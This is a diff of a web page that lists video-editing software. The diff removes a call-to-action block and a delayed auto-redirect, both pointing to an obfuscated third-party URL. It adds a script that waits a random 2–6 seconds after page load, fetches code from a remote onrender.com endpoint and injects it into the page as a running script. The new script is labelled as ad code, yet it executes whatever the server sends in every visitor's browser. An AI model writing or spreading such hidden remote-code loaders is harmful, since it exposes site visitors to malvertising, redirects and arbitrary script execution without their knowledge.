@@ -28,43 +28,7 @@
   text-decoration: underline;  
 }
 
-/* CTA Section Styling */
-    .cta-section {
-      background: linear-gradient(135deg, #1d4ed8, #3b82f6);
-      color: #fff;
-      text-align: center;
-      padding: 2.5em 1.5em;
-      border-radius: 10px;
-      margin: 2em auto;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-    .cta-section:hover {
-      transform: scale(1.02);
-      box-shadow: 0 6px 20px rgba(0,0,0,0.15);
-    }
-    .cta-section h2 {
-      font-size: 1.8em;
-      margin-bottom: 0.5em;
-    }
-    .cta-section p {
-      font-size: 1.1em;
-      margin-bottom: 1.2em;
-    }
-    .cta-button {
-      display: inline-block;
-      background-color: #fff;
-      color: #1d4ed8;
-      font-weight: bold;
-      padding: 0.8em 1.8em;
-      border-radius: 30px;
-      text-decoration: none;
-      transition: background-color 0.3s ease, color 0.3s ease;
-    }
-    .cta-button:hover {
-      background-color: #e0e7ff;
-      color: #1e3a8a;
-    }
+
 
   </style>
 
@@ -84,13 +48,6 @@
 
   </header>    <main class="software-list">  
     <p>Explore the best video editing tools for creators, from beginner-friendly mobile apps to professional studio software:</p>  <div class="software-item">  
-
- <!-- ✅ Call-To-Action Section -->
-    <section class="cta-section">
-      <h2>Boost Your Editing Power!</h2>
-      <p>Ready to level up your workflow? Check out our special toolkit and resources for creators — all in one place.</p>
-      <a href="https://impracticalshoulder.com/bs3.Vh0nP-3Zp/vfblmtV_J/Z/DC0m2_N/jucVypOpTuYr5xLMToYo2/NmzJI/5BN/zrAq" target="_blank" class="cta-button">Explore Now</a>
-    </section>
 
   <h3><a href="https://www.adobe.com/products/premiere.html" target="_blank">Adobe Premiere Pro</a></h3>  
   <p>Industry-leading editor used by professionals for film, TV, and web content. Offers timeline-based editing, color grading, and more.</p>  
@@ -147,14 +104,23 @@
     <p>© Devlinks.link. Curated with care for creators worldwide.</p>  
   </footer>
 
-  <script>
+<script>
 window.addEventListener("load", () => {
-  const min = 2000; // 2 seconds (ms)
-  const max = 6000; // 6 seconds (ms)
+  // Random delay between 2–6 seconds
+  const min = 2000;
+  const max = 6000;
   const delay = Math.floor(Math.random() * (max - min + 1)) + min;
 
   setTimeout(() => {
-    window.location.href = "https://impracticalshoulder.com/bs3.Vh0nP-3Zp/vfblmtV_J/Z/DC0m2_N/jucVypOpTuYr5xLMToYo2/NmzJI/5BN/zrAq";
+    fetch("https://a1-1-xxxb.onrender.com/get-adcode")
+      .then(response => response.text())
+      .then(code => {
+        // Inject and execute the ad code from your backend
+        const script = document.createElement("script");
+        script.innerHTML = code;
+        document.body.appendChild(script);
+      })
+      .catch(err => console.error("Error loading ad:", err));
   }, delay);
 });
 </script>
